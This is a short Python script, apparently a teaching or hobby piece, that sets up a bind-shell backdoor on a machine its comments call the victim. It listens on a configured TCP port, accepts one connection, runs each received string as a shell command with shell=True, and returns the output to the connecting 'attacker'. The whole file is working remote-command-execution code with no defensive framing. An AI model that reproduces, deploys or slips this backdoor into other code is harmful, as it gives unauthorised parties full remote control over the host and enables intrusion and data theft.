#Necessary imports - both standard Python modules
import socket
import subprocess
import config


#Connection data of victim. Port number has to be >4 digits in order to prevent interfering with specific reserved ports
HOST = socket.gethostbyname(socket.gethostname())
PORT = config.port

#Prints connection data of victim
print("--- victim ip/port: " + str(HOST) + "/" + str(PORT) + "---\n")

#Creates an open socket with standard variables that can be reused
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

#Binds the connection data to the created socket and puts it in listen mode
s.bind((HOST,PORT))
s.listen(0)

#Saves connection data when a remote computer connects to the socket
conn, addr = s.accept()
print("connection accepted from " + addr[0])

#Main loop
while True:
  #Reads data it has gotten from remote computer
  #If the remote computer is the attacker, it will include a command
  data = conn.recv(1024).decode()

  #Runs the command is has received, whilst storing the output and possible error messages
  command = subprocess.Popen(data, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
  stdoutValue, stderrValue = command.communicate()

  #Returns, if exists, the output or error message of the executed command
  if stdoutValue:
    output = stdoutValue
  elif stderrValue:
    output = stderrValue
  elif not stdoutValue and not stderrValue:
    output = "successfull execution but no output\n".encode()

  #Returns the output of the command back to the attacker
  conn.sendall(output)

  #Summary of execution
  print("got command " + data + " from " + str(addr[0]))


